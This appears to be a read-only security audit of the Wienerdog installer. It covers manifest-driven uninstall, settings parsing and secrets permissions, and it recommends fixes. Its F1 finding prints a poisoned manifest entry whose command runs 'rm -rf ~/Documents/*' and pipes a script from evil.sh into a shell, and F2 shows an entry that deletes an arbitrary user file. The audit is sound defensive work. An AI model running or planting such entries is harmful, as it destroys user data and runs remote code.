# Wienerdog Security Audit — Install / Sync / Uninstall Filesystem Integrity

> **Consensus status (2026-07-15): the mechanisms are confirmed; severity must
> not be added independently to the same-user cluster.** F1/F2 require prior
> manifest write access, so they are confused-deputy/time-shifted execution and
> deletion primitives rather than a new privilege boundary against arbitrary
> same-user malware. They are still mandatory safety fixes: uninstall must
> schema-validate every entry, derive scheduler unload commands from trusted
> platform data, constrain every destructive path to an expected root, and
> require ownership evidence. A manifest hash stored in the same mutable
> manifest is drift detection, not authentication.

**Dimension:** Install / sync / uninstall filesystem integrity & data-destruction safety
**Date:** 2026-07-15
**Scope:** `src/cli/{init,sync,adopt,uninstall}.js`, `src/adapters/{shared,claude,codex}.js`, `src/core/{paths,manifest,vault,layout-infer,adopt-git,vendor}.js`, `src/scheduler/{spawn,tccguard}.js`
**Method:** Read-only source review. No files in the repo were modified.

---

## Executive summary

This is an unusually well-defended codebase. The team has clearly been burned by
prior P0/P1 data-loss bugs and has layered strong, explicitly-documented controls:
`lstat`-based ownership fingerprints, prove-before-delete hash checks, a realpath-aware
global guard protecting the manifest/core/config, crash-safe delete ordering, and
sentinel-ambiguity refusals. Most of the "obvious" attacks (symlink-swap deletes,
clobbering user skill dirs, self-wedging sentinels) are already closed.

The residual risk concentrates in **one place: the install manifest is an
unauthenticated, user/agent-writable data file that `uninstall` replays as
instructions.** For most entry kinds the blast radius is bounded, but two kinds
(`scheduler-entry.unload` and unhashed `file`) turn a poisoned manifest into an
**arbitrary-command-execution / arbitrary-file-delete primitive**, laundered as
Wienerdog's own action and (for the exec case) invisible in the uninstall
confirmation. The exec case is a **documented, accepted non-goal** (WP-088); I am
re-raising it because in a product whose entire purpose is installing skills/hooks
that run as the user, "an attacker who can write `~/.wienerdog`" is a realistic,
low-bar precondition, not a theoretical one.

---

## Findings (most severe first)

### F1 — Poisoned manifest `scheduler-entry.unload` = arbitrary command execution on uninstall
**Severity: HIGH** · **Confidence: High** · **Status: exploitable (dev-acknowledged residual)**

**Where:** `src/core/manifest.js:268-291` (`reverseSchedulerEntry`) → `src/scheduler/spawn.js:21-33` (`schedulerSpawn`), reached from `src/core/manifest.js:561`.

**What:** `reverseSchedulerEntry` runs the entry's stored `unload` argv verbatim:

```js
require('../scheduler/spawn').schedulerSpawn(entry.unload);   // manifest.js:277
...
const r = spawnSync(argv[0], argv.slice(1));                   // spawn.js:31
```

The legitimate writer only ever stores fixed-shape argv (`['launchctl','bootout',…]`,
`['schtasks','/delete',…]` — `schedule.js:114,138`, `generators.js:439`). But
`reverse()` does **no validation** of `unload` — it executes whatever the manifest
contains.

**Scenario (data-loss / RCE):** A malicious or compromised skill/hook (Wienerdog's
own product surface), or any process running as the user, appends one entry to
`~/.wienerdog/install-manifest.json`:

```json
{ "kind": "scheduler-entry", "path": "/tmp/x",
  "unload": ["/bin/sh", "-c", "rm -rf ~/Documents/* ; curl evil.sh | sh"] }
```

The next time the user runs `wienerdog uninstall`, the argv is executed as the user.
Two aggravating factors:
- **The `unload` argv is never shown in the confirmation screen.** `uninstall.js:60`
  prints only `[${entry.kind}] ${entry.path}`, so the victim sees a benign
  `[scheduler-entry] /tmp/x` line and cannot see the command that will run.
- `--yes` skips the prompt entirely.

**Mitigations present:** The developers explicitly documented this as out of scope:
`manifest.js:481-482` — *"It does NOT police INDIRECT side effects — e.g. a
scheduler-entry's executable `unload` argv — … see the WP-088 spec Non-goals."* The
global deferred-member guard (F-note below) blocks *path*-based abuse but by design
does not touch `unload`.

**Recommendation:** Treat `unload` as data, not code. Either (a) re-derive the argv at
uninstall time from `kind`+`path`+`label` instead of trusting the stored array, or (b)
whitelist `argv[0]` to a known set (`launchctl`/`systemctl`/`schtasks`) and validate the
argument shape, and (c) print the `unload` argv in the confirmation list so it is never
invisible.

---

### F2 — Poisoned/tampered manifest `file` entry = arbitrary user-file deletion on uninstall
**Severity: HIGH** · **Confidence: High** · **Status: exploitable**

**Where:** `src/core/manifest.js:521-537` (`kind:'file'` reverse).

**What:** After the global guard (which only protects manifest/core/config), a
`file` entry is deleted with **no path containment** — it may point anywhere on disk:

```js
if (entry.hash && sha256File(entry.path) !== entry.hash) { ...keep... }   // only if a hash is present
if (!dryRun) fs.rmSync(entry.path, { force: true });                      // else: unconditional delete
```

The prove-before-delete hash check is the **only** guard, and it is trivially bypassed
by **omitting the `hash` field**. There is no check that `entry.path` lives under
`~/.claude`, `~/.codex`, or the core.

**Scenario (data-loss):** An attacker (malicious skill, compromised agent, any
user-level process) writes:

```json
{ "kind": "file", "path": "/Users/victim/work/thesis.docx" }
```

`wienerdog uninstall` deletes `thesis.docx`. Variants with other kinds have smaller
blast radius but are still abusable: `kind:'dir'` removes an arbitrary *empty*
directory (`manifest.js:538-554`); `kind:'symlink'` unlinks an arbitrary symlink
(`reverseSymlink`, `manifest.js:150-159`); `kind:'settings-entry'` (F3) reformats /
partially rewrites an arbitrary JSON file and crashes uninstall on a non-JSON target.

**Mitigations present:** The path *is* shown in the confirmation list (`uninstall.js:60`),
so a scrutinizing user without `--yes` could notice an out-of-place path. The
manifest is user-owned, so this is a "user-can-hurt-themselves" primitive rather than
a privilege escalation — but the point is **laundering**: the destructive action is
attributed to Wienerdog and time-shifted to whenever the user next uninstalls.

**Recommendation:** Bound every deleting reverser to known roots (core, `paths.claudeDir`,
`paths.codexDir`, `~/.local/bin`) via the same `contains()`/`sameResolvedDir()` helpers
already used for `copied-skill`/`vendored-tree`; refuse+notice anything outside.
Consider requiring a `hash` for `file`-kind deletion (hash-less = "unverifiable = keep",
the safe direction the code already uses elsewhere).

---

### F3 — Malformed / JSONC `settings.json` throws uncaught → uninstall aborts (non-reversible) and sync crashes
**Severity: MEDIUM** · **Confidence: High** · **Status: exploitable (accidental or deliberate)**

**Where:** `src/adapters/shared.js:224` (`applySettings`) and `src/core/manifest.js:231` (`reverseSettingsEntry`).

**What:** Both paths call `JSON.parse(raw)` with **no try/catch**:
- `applySettings` (shared.js:224): a user who hand-edited `settings.json`/`hooks.json`
  into invalid JSON (a trailing comma, a `//` comment) makes `sync` throw an uncaught
  `SyntaxError`. The file is not clobbered (fail-safe), but the *entire* sync aborts.
- `reverseSettingsEntry` (manifest.js:231): the same malformed file makes
  **`uninstall` throw mid-reverse**. The reverse loop (`manifest.js:471-579`) has no
  per-entry try/catch, so the whole uninstall aborts before the manifest is deleted.
  The install becomes **un-uninstallable** until the user hand-repairs the JSON.

The "reset to `{}` on non-object" branch (shared.js:225-227) only fires when the file
parses to a valid *non-object* (top-level array/`null`/string) — which is never a valid
Claude/Codex settings file — so I found **no path where valid user settings are silently
discarded**. The real defect is the *uncaught throw*, not the reset.

**Scenario:** User adds a `// comment` to `~/.claude/settings.json` (common habit). Every
`wienerdog sync` now fails; `wienerdog uninstall` fails and refuses to complete.

**Recommendation:** Wrap both `JSON.parse` calls; on parse failure, on the reverse side
skip-with-notice (like the managed-block ambiguity path at manifest.js:184-189) so
uninstall continues and stays reversible; on the forward side emit a `WienerdogError`
that names the file and does not abort skills/hooks installation.

---

### F4 — Managed-block reverse unconditionally strips one newline per side → can merge adjacent user lines
**Severity: MEDIUM** · **Confidence: Medium** · **Status: exploitable in a narrow layout**

**Where:** `src/core/manifest.js:196-213` (`reverseManagedBlock`).

**What:** Reverse removes exactly one leading and one trailing newline around the block:

```js
if (before.endsWith('\n')) before = before.slice(0, -1);   // manifest.js:202
if (after.startsWith('\n')) after = after.slice(1);        // manifest.js:203
const remaining = before + after;
```

This is correct for the append case (forward added `\n\n…\n`, reverse removes the pair)
and for the created-file case. But if the user **relocated the block** so it directly
abuts surrounding text with only a *single* newline on each side (no blank-line
separator), reverse removes both separators and **concatenates the two adjacent lines**:
`"…intro\n<block>\nrest…"` → `"…introrest…"`. The doc comment (manifest.js:198-201)
claims the relocated case "uninstalls to exactly one blank line between the surrounding
regions", which only holds when the user left blank lines around the block.

Separately, when the original file had multiple trailing newlines, the forward
`replace(/\n+$/,'')` (shared.js:145) collapses them, so uninstall does not restore a
byte-identical file (cosmetic).

**Scenario (content corruption on uninstall):** A user who tucked the managed block
between two prose lines of a large `CLAUDE.md` loses the line break between them on
uninstall.

**Recommendation:** On the replace/relocated path, restore separators symmetrically
(e.g. re-insert a single `\n` when both sides had exactly one), or only strip the pair
when `entry.createdFile`/append provenance is known.

---

### F5 — `settings-entry.commands` recorded once and never upserted → orphaned hook on command change
**Severity: LOW-MEDIUM** · **Confidence: Medium** · **Status: latent reversibility gap**

**Where:** `src/adapters/shared.js:287-293` (`recordOnce`, dedup on kind+path only).

**What:** `applySettings` records the settings-entry via `recordOnce`, which **no-ops
when a kind+path entry already exists** — it does not refresh `commands`. (Contrast
`recordCopiedSkill` at shared.js:61-71, which was specifically built to *upsert* the
hash for exactly this reason.) If a future version changes the hook command string
(different bin filename, different core path), sync writes the new hook but the manifest
keeps the **old** `commands`. `reverseSettingsEntry` strips only recorded commands, so
uninstall leaves the new Wienerdog hook behind — a reversibility/orphan gap.

Low likelihood today because the hook path (`<core>/bin/session-start.sh`) is stable.

**Recommendation:** Give settings-entry the same upsert treatment as copied-skill:
refresh `commands` on every apply.

---

### F6 — `secrets/` 0700 enforced only on init-created dir; pre-existing weak-perm dir left weak
**Severity: LOW-MEDIUM** · **Confidence: Medium** · **Status: real but narrow**

**Where:** `src/cli/init.js:126-136`.

**What:** init enforces `0700` on `secrets/` **only when init itself created it**
(`if (createdSecrets) fs.chmodSync(paths.secrets, 0o700)`), with an explicit comment
that "a pre-existing user path is never re-permissioned by init." If
`~/.wienerdog/secrets` already exists with loose perms (created by a prior tool, a
different umask, or an attacker pre-seeding it `0777`), init leaves it world-readable —
and OAuth tokens (`secrets/google-token.json`, written later by `src/gws/client.js`) land
in that dir. An attacker who can pre-create the dir can guarantee the token is readable.

**Recommendation:** On every init/sync, `chmod 0700` the `secrets/` dir if it is
Wienerdog's (record it in the manifest) regardless of who created it, and write token
files `0600`.

---

### F7 — A single stray full-line sentinel in user `CLAUDE.md` breaks the entire sync (skills + hooks included)
**Severity: LOW** · **Confidence: High** · **Status: fail-safe DoS**

**Where:** `src/adapters/shared.js:31-33` (`locateManagedBlock` throw) via `applyManagedBlock` (shared.js:127), called first in `applyClaudeAdapter` (claude.js:45-59).

**What:** If a user's `CLAUDE.md` contains a line that trims exactly to
`<!-- wienerdog:begin -->` (or `:end`) — e.g. pasted from Wienerdog docs — with only one
of the pair present, `locateManagedBlock` throws "ambiguous markers". Because Step 1
runs **before** Steps 2-3 in the adapter and nothing wraps the throw, the whole adapter
throws and sync aborts — so **skills and hooks are not installed either**. Correct
fail-safe (never clobbers), but one stray comment line denies all of sync until
hand-fixed. The error tells the user to resolve by hand, so it is recoverable.

**Recommendation:** Run the always-safe Steps 2-3 (skills + hooks) even when Step 1
refuses; surface the managed-block ambiguity as a notice rather than a fatal for the
whole adapter.

---

### F8 — `applySkillLinks` silently clobbers a user symlink named `wienerdog-*`
**Severity: LOW** · **Confidence: High** · **Status: minor, namespaced**

**Where:** `src/adapters/shared.js:368-385`.

**What:** When a symlink exists at `<harness>/skills/wienerdog-<x>` pointing somewhere
other than our source, the code `fs.unlinkSync`s it and re-links to our target with **no
notice** — unlike the sibling branches for a real dir (shared.js:414-416) or a regular
file (shared.js:420), which preserve-and-notice. A user who deliberately symlinked
`wienerdog-foo` at their own target loses it silently. The `wienerdog-*` namespace is
Wienerdog's, so this is defensible, but the *silence* is inconsistent with the rest of
the function's preserve-and-notice discipline.

**Recommendation:** Emit a notice when replacing a foreign-target symlink, or only
replace when the existing link target is a prior Wienerdog source.

---

### F9 — `adopt` git-inits and `git add -A` a user-chosen path → can snapshot secrets / huge trees
**Severity: LOW** · **Confidence: Medium** · **Status: footgun, local-only**

**Where:** `src/cli/adopt.js:184-255`, `src/core/adopt-git.js`.

**What:** `adopt <path>` will `git init` + `git add -A` + `git commit` an arbitrary
user-supplied directory (when it has no HEAD). Pointed at a broad location (e.g. `~`),
it initializes a repo there and commits everything reachable — including `~/.ssh`,
`~/.aws`, tokens — into a **local** repo. The optional `.gitignore` offer
(`DEFAULT_GITIGNORE_LINES`, adopt-git.js:15-21) targets Obsidian churn, **not** secrets,
and is opt-in. Containment is otherwise good: the core-nesting refusal (adopt.js:139-156,
realpath-based) and the TCC guard (adopt.js:171-179) block `.wienerdog`, Documents,
Desktop, Downloads, and iCloud. Risk is bounded because nothing is pushed — it is a
local commit — but it is a data-handling surprise.

**Recommendation:** Warn when the adopted tree is very large or looks like a home dir /
contains dotfiles like `.ssh`/`.aws`; consider seeding a broader default `.gitignore` for
common secret paths before the first `git add -A`.

---

### F10 — Env-override paths (`WIENERDOG_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `WIENERDOG_VAULT`) used raw
**Severity: LOW / INFO** · **Confidence: Medium** · **Status: self-inflicted only**

**Where:** `src/core/paths.js:26-48`.

**What:** Overrides are consumed verbatim (`env.WIENERDOG_HOME || path.join(...)`) with
no normalization or absolute-path requirement. A relative or `..`-laden value
(`WIENERDOG_HOME=../../etc`) redirects every write/delete (manifest, secrets, `disposeCoreMechanics`
recursive removals) to a cwd-relative location. Because these are the operator's own
environment variables, the threat model is weak — but any code path that resolves them
relative to a moving cwd, or a scenario where the env is attacker-influenced (CI, a
wrapper script), could send `rmSync`/`writeFileSync` somewhere unexpected. `disposeCoreMechanics`
recursively `rmSync`s `paths.state/logs/schedules/secrets`, all derived from `core`.

**Recommendation:** `path.resolve` overrides and require them to be absolute; reject
values containing `..` segments.

---

## Solid controls worth preserving

These are genuinely strong and should not be regressed:

- **`lstat`-based directory fingerprinting (`hashDir`, manifest.js:106-133).** Uses
  `Dirent` with `lstat` semantics and never dereferences symlinks, so an internal
  symlink cannot trick the ownership check into hashing a foreign target. Fail-closed
  to `null` on any read error, and `null` can never equal a recorded string hash.
- **`reverseCopiedSkill` symlink-swap defense (manifest.js:347-380).** Requires the
  parent to *resolve* equal to a real harness skills root, the basename to be
  `wienerdog-*`, the path to be a **real dir via `lstat`** (not a symlink to an identical
  tree), *and* a recorded-hash match. This closes the "move our copy, leave a symlink to
  an identical tree, get the symlink deleted" attack the comment describes.
- **Global deferred-member guard (manifest.js:471-519).** A single realpath-aware guard
  at the top of the reverse loop protects the manifest, core, and `config.yaml` from
  *every* entry kind and from normalized/symlinked path aliases — a strong,
  centralized invariant.
- **Prove-before-delete throughout, incl. TOCTOU re-verify at the deferred config
  delete site (uninstall.js:141-165).** Config is proven unmodified in `reverse()`, then
  its hash is **re-checked immediately before the actual delete** (after the slow
  mechanics sweep), so a user edit during the window aborts the delete.
- **Crash-safe delete ordering (uninstall.js:126-165).** Manifest deleted *before*
  config, gated on `rmSync`'s own throw/no-throw outcome (not an ambiguous
  `existsSync`), preserving the "manifest-present ⟹ config-present" invariant so every
  retry stays nested-vault-safe.
- **Sentinel discipline (shared.js:84-95 `buildBlock`, shared.js:20-39 /
  manifest.js:57-76 `locateManagedBlock`).** Digest lines that trim to a sentinel are
  neutralized (self-wedge prevention), and any ambiguous marker set refuses to edit
  rather than guessing and swallowing user text.
- **Containment anchors for recursive removers (`vendored-tree`, `copied-skill`) via
  `sameResolvedDir` realpath equality (manifest.js:296-302, 318-380).** The recursive
  `rmSync`ers only fire on paths that resolve to an expected root.
- **TCC guard normalization (tccguard.js:45-91).** Folds firmlink spelling, Unicode
  NFC/NFD, and case at one choke point before the containment decision, over-refusing
  fail-safe — a thoughtful defense against `adopt` hanging on macOS protected dirs.
- **Vault always preserved (`vault-file`/`vault-dir` skipped in reverse,
  manifest.js:567-572; nested-vault containment in `disposeCoreMechanics`,
  manifest.js:638-641).** The user's notes are treated as untouchable.
- **Atomic writes.** Digest via tmp+rename (sync.js:205-207); vendored version dir via
  `staging.<pid>`+rename (vendor.js:137-141); `current` symlink repoint via
  tmp+atomic-rename with orphan sweep (vendor.js:68-108).

---

## Note on threat model

Findings F1 and F2 both rest on "an attacker can write `~/.wienerdog/install-manifest.json`."
In most tools that would be a high bar. In Wienerdog it is not: the product's core
function is installing **skills and hooks that execute inside the user's AI agent**, and
those run with the user's full filesystem authority. A single malicious or compromised
skill can plant manifest entries that lie dormant until the user runs `wienerdog uninstall`,
at which point Wienerdog itself performs the deletion or command execution. The manifest
is currently trusted as code; it should be treated as untrusted data (validated,
path-bounded, and — for `unload` — not executed verbatim).
